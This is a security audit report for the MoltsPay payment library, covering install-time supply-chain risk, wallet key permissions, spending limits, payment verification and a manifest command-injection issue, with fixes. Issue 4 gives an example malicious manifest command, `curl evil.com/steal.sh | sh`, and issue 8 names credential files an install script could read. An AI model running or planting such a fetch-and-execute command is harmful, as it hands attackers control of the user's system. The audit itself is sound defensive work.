# MoltsPay Security Analysis

**Version:** 0.8.11  
**Date:** 2026-02-19  
**Analyst:** Zen7  

**Updated:** 2026-08-06 - added issue 8 (install-time code execution), audited against v2.4.0  
**Updated:** 2026-08-10 - issue 8 remediated in `moltspay-skill` (e8952b9, 8da3b56); locations and status refreshed

---

## Summary

| Severity | Count | Status |
|----------|-------|--------|
| [HIGH] HIGH | 1 | Fixed - see issue 8 |
| [MED] MEDIUM | 3 | Should fix |
| [LOW] LOW | 3 | Nice to have |
| [OK] GOOD | 3 | No issues |

Issues 1-7 cover the **runtime** attack surface (key storage, amount
verification, transport). Issue 8 covers the **install-time** surface, which the
original analysis did not examine.

---

## [HIGH] HIGH Severity Issues

### 8. Install-Time Code Execution / Supply Chain (Distribution) - FIXED in `moltspay-skill` 2026-08-06

**Location (as analyzed 2026-08-06, before remediation - these lines no longer exist):**
- `moltspay-skill/scripts/setup.sh:12` - `npm install -g moltspay`
- `moltspay-skill/scripts/setup.js:36` - `run('npm install -g moltspay')`
- `moltspay-skill/package.json` - `"postinstall": "node scripts/setup.js"`

**Problem (was):**

`npm install` does not merely download files. It executes the `preinstall` /
`install` / `postinstall` scripts declared by **any** package in the resolved
dependency tree, with the invoking user's privileges, *before* the tool is ever
run. Installing moltspay v2.4.0 resolves **149 packages**; 3 of them declare
install scripts (`bigint-buffer`, `bufferutil`, `utf-8-validate`), plus moltspay
itself.

Three factors compound here:

1. **Unpinned.** The install requests `moltspay` with no version and no
   lockfile, so npm resolves the whole tree fresh on every run. A maintainer
   account compromise anywhere in those 149 packages is picked up
   automatically, with no diff to review. (Prior art: `event-stream`,
   `ua-parser-js`, `node-ipc`, `coa`/`rc`.)
2. **Automatic.** `postinstall` in the skill's own `package.json` means the
   global install fires during `npm install` of the skill. The operator never
   sees a prompt; the only output is `[OK] moltspay installed`.
3. **High-value target.** Unlike a typical library, this package's install
   footprint sits next to spending authority. Code running as the installing
   user can read:

   | Path | Consequence |
   |------|-------------|
   | `~/.moltspay/wallet.json` | Private key for all 8 chains |
   | `<configDir>/balance-identity.key` | Signs every custodial-balance deduction. Whoever holds it can drain every account this client is bound to. |
   | `~/.git-credentials` | Plaintext VCS tokens if `helper = store` is configured |
   | `~/.npmrc` | npm publish token -> attacker can ship a poisoned `moltspay`, propagating to every downstream install |

**Aggravating factor - `alipay-bot` is outside lockfile integrity:**

moltspay's own `scripts/postinstall.js` invokes
`@alipay/agent-payment install-cli`, which downloads the `alipay-bot` binary
from Alipay's CDN. `alipay-bot` is not on npm (Alipay distributes it directly,
licensed UNLICENSED), so it **cannot** be a declared dependency and is
therefore **not covered by `package-lock.json` integrity hashes**. This
provisioning is legitimate and documented, but mechanically it is
indistinguishable from a malicious postinstall, and no lockfile discipline
constrains the bytes it fetches.

**Secondary issue - PATH trust (was):**

Both setup scripts gated on `command -v moltspay` / `which moltspay` and skipped
installation if anything by that name was already on `PATH`. That binary was then
trusted and invoked as `moltspay init`, which generates a wallet. Any
attacker-planted executable named `moltspay` earlier in `PATH` would be silently
adopted.

**Fix (applied):**

Install locally, pinned, from a committed lockfile, with lifecycle scripts
disabled, and invoke the local binary by explicit path:

```jsonc
// moltspay-skill/package.json
{
  "private": true,
  "dependencies": { "moltspay": "2.4.1" }   // exact - not ^2.4.1, not latest
}
```

```bash
npm ci --prefix "$SKILL_DIR" --ignore-scripts --no-audit --no-fund
"$SKILL_DIR/node_modules/.bin/moltspay" --help
```

Commit `package-lock.json`. Remove `postinstall` from the skill's
`package.json` so provisioning is an explicit operator action.

**Where this now lives** (`moltspay-skill` @ 8da3b56):

| File | What it does now |
|------|------------------|
| `package.json` | `"private": true`, `"moltspay": "2.4.1"` exact, **no `postinstall`** - only an opt-in `"setup"` script |
| `package-lock.json` | Committed, lockfileVersion 3, 233 entries / 213 packages actually installed - `npm ci` verifies integrity hashes against it |
| `scripts/setup.sh:22-26` | `npm ci --prefix "$SKILL_DIR" --ignore-scripts --no-audit --no-fund`; install failure is fatal |
| `scripts/setup.js:46-61` | Same via `spawnSync`; exits non-zero before any wallet state is touched |
| `scripts/setup.sh:28` / `setup.js:63` | Gate on `[ ! -x "$MOLTSPAY" ]` / `fs.existsSync(MOLTSPAY)` - the **local path**, not `command -v` |
| `README.md` (Installation) | Operator-facing steps + the control-rationale table |

The `PATH` trust path is closed: no setup script consults `PATH` any more, and
every helper refuses to run when `node_modules/.bin/moltspay` is absent rather
than falling back to whatever `moltspay` it finds.

**Residual risk (accepted):** `alipay-bot` is still fetched from Alipay's CDN
outside lockfile integrity - see the trade-off below. It is now an explicit
operator command instead of an install-time side effect, which is the mitigation,
not an elimination.

These are **two independent layers**, and both are required:

| Control | Blocks |
|---------|--------|
| Exact version + committed lockfile | Ever *resolving* a poisoned release |
| `npm ci` integrity hashes | Tampered bytes from a compromised registry/mirror |
| `--ignore-scripts` | Poisoned code *executing*, even if it did get installed |
| Local install (not `-g`) | Blast radius; also removes the `PATH` trust path above |

The first two are "do not install the bad thing". The third is "if you did,
do not run it".

**Trade-off - Alipay rail requires manual provisioning:**

With `--ignore-scripts`, the CDN fetch above does not happen at install time.
Crypto, WeChat Pay, and balance rails are unaffected. The Alipay rail fails
only at first use, and does not fail silently: the runtime `ensureCli` gate
(`dist/index.js`) intercepts it and states the command to run:

```bash
npx -y @alipay/agent-payment install-cli
```

One-time, and deliberately explicit - the point is that the CDN download
becomes a conscious, visible action rather than a side effect of
`npm install`. `MOLTSPAY_SKIP_CLI_INSTALL=1` makes that intent explicit if
lifecycle scripts are re-enabled later.

**Status:** Fixed - `moltspay-skill` e8952b9 (local pinned install) and 8da3b56
(pin 2.4.1). Operator-facing steps documented in `moltspay-skill/README.md`
(Installation). Re-verify with §"Where this now lives" above after any change to
`package.json` / `setup.sh` / `setup.js`.

---

## [OK] FIXED - Previously HIGH Severity

### 1. Private Key Stored in Plaintext (Client) - FIXED in v0.8.12

**Location:** `src/client/index.ts` - `MoltsPayClient.init()`

**Problem (was):**
- Private key stored with default file permissions
- Anyone with file system access could read it

**Fix Applied:**
```typescript
// Now sets secure permissions (0o600 = owner read/write only)
writeFileSync(walletPath, JSON.stringify(walletData, null, 2), { mode: 0o600 });

// Also checks and fixes permissions on load
const mode = stats.mode & 0o777;
if (mode !== 0o600) {
  console.warn('[MoltsPay] WARNING: wallet.json has insecure permissions');
  chmodSync(walletPath, 0o600);
}
```

**Status:** [OK] Fixed - matches SSH private key security model

---

## [MED] MEDIUM Severity Issues

### 2. Daily Spending Limit Not Persisted (Client)

**Location:** `src/client/index.ts` - `checkLimits()`, `recordSpending()`

**Problem:**
```typescript
private todaySpending: number = 0;       // <- In memory only!
private lastSpendingReset: number = 0;   // <- Lost on restart!
```

**Risk:**
- Restarting the client resets daily spending to 0
- Malicious code could restart client to bypass limits
- Legitimate restarts could allow overspending

**Impact:** Daily limit protection can be bypassed

**Recommendation:**
```typescript
// Persist spending to config file
private loadSpending(): void {
  const spendingPath = join(this.configDir, 'spending.json');
  if (existsSync(spendingPath)) {
    const data = JSON.parse(readFileSync(spendingPath, 'utf-8'));
    if (data.date === this.getTodayString()) {
      this.todaySpending = data.amount;
    }
  }
}

private saveSpending(): void {
  const spendingPath = join(this.configDir, 'spending.json');
  writeFileSync(spendingPath, JSON.stringify({
    date: this.getTodayString(),
    amount: this.todaySpending
  }));
}
```

---

### 3. Server Doesn't Verify Payment Amount Locally (Server)

**Location:** `src/server/index.ts` - `validatePayment()`

**Problem:**
```typescript
private validatePayment(payment, config): { valid: boolean; error?: string } {
  // Only checks version, scheme, network
  // Does NOT verify: payment.accepted.amount === config.price * 1e6
}
```

**Risk:**
- Relies entirely on facilitator for amount verification
- If facilitator has a bug, underpayment could slip through
- Defense in depth principle violated

**Recommendation:**
```typescript
private validatePayment(payment, config): { valid: boolean; error?: string } {
  // ... existing checks ...
  
  // Add amount verification
  const expectedAmount = Math.floor(config.price * 1e6).toString();
  const paymentAmount = payment.accepted?.amount;
  
  if (paymentAmount !== expectedAmount) {
    return { 
      valid: false, 
      error: `Amount mismatch: expected ${expectedAmount}, got ${paymentAmount}` 
    };
  }
  
  return { valid: true };
}
```

---

### 4. Command Injection Risk in CLI Server (CLI)

**Location:** `src/cli/index.ts` - `start` command

**Problem:**
```typescript
// User-defined command from manifest is executed via shell
spawn('sh', ['-c', service.command], { ... });
```

**Risk:**
- If manifest file is from untrusted source, arbitrary code execution
- Example malicious manifest:
  ```json
  { "command": "curl evil.com/steal.sh | sh" }
  ```

**Impact:** Full system compromise

**Mitigations:**
1. Document that manifest must be from trusted source
2. Add manifest signature verification (optional)
3. Use execFile with args array instead of shell:
   ```typescript
   // Safer: parse command into args
   const [cmd, ...args] = service.command.split(' ');
   spawn(cmd, args, { ... });
   ```

---

## [LOW] LOW Severity Issues

### 5. CORS Allows All Origins (Server)

**Location:** `src/server/index.ts` - `handleRequest()`

**Problem:**
```typescript
res.setHeader('Access-Control-Allow-Origin', '*');
```

**Risk:**
- Any website can call the API
- Potential CSRF-like attacks (though limited since it's payment API)

**Recommendation:**
- Document this is intentional for x402 protocol
- Add option to configure allowed origins:
  ```typescript
  options: {
    cors: {
      origin: '*',  // or ['https://trusted.com']
    }
  }
  ```

---

### 6. No Rate Limiting (Server)

**Location:** `src/server/index.ts`

**Problem:**
- No built-in rate limiting
- Could be DoS'd with repeated requests

**Recommendation:**
- Add simple rate limiting:
  ```typescript
  import rateLimit from 'express-rate-limit';
  // or implement simple in-memory rate limit
  ```
- Document that nginx/reverse proxy should handle this in production

---

### 7. HTTP URLs Not Warned (Client)

**Location:** `src/client/index.ts` - `pay()`

**Problem:**
- Client accepts HTTP URLs without warning
- MITM attack could intercept payment requirements

**Recommendation:**
```typescript
if (serverUrl.startsWith('http://') && !serverUrl.includes('localhost')) {
  console.warn('[MoltsPay] WARNING: Using HTTP is insecure. Use HTTPS in production.');
}
```

---

## [OK] Good Security Practices

### Replay Attack Protection
- [OK] EIP-3009 uses unique nonce per authorization
- [OK] `validBefore` timestamp provides expiration (1 hour)
- [OK] Facilitator tracks used nonces

### Amount Tampering Protection
- [OK] Amount is part of EIP-712 signed payload
- [OK] Cannot modify amount without invalidating signature

### Pay-for-Success Model
- [OK] Service executes before settlement
- [OK] If service fails, payment is not settled
- [OK] Client only charged on success

---

## Recommendations Summary

### Before v1.0 Release (Must Have)
1. [x] ~~Encrypt private keys at rest (or use keychain)~~ -> Using 0o600 permissions (like SSH)
2. [x] ~~Set file permissions on wallet.json (0o600)~~ -> [OK] Fixed in v0.8.12
3. [ ] Persist daily spending limits to disk
10. [ ] Pin moltspay to an exact version, install locally from a committed
    lockfile with `--ignore-scripts`, and drop `postinstall` from the skill
    package (issue 8)

### Before Production Use (Should Have)
4. [ ] Add local amount verification on server
5. [ ] Document command injection risk in manifest
6. [ ] Add HTTP URL warning

### Nice to Have
7. [ ] Configurable CORS
8. [ ] Built-in rate limiting
9. [ ] Manifest signature verification

---

## File Permissions Audit

| File | Current | Should Be | Status |
|------|---------|-----------|--------|
| `~/.moltspay/wallet.json` | 0o600 | 0o600 | [OK] Fixed |
| `~/.moltspay/config.json` | 0o644 | 0o644 | [OK] OK |
| `~/.moltspay/.env` | 0o600 | 0o600 | [OK] OK |
| `<configDir>/balance-identity.key` | 0o600 | 0o600 | [OK] OK (auto-created, v2.4) |

Note: file permissions protect these keys from *other users* on the machine.
They do not protect against code running **as the owning user** - which is
exactly what an install-time script is (issue 8).

---

*Report generated: 2026-02-19*  
*Issue 8 added: 2026-08-06*
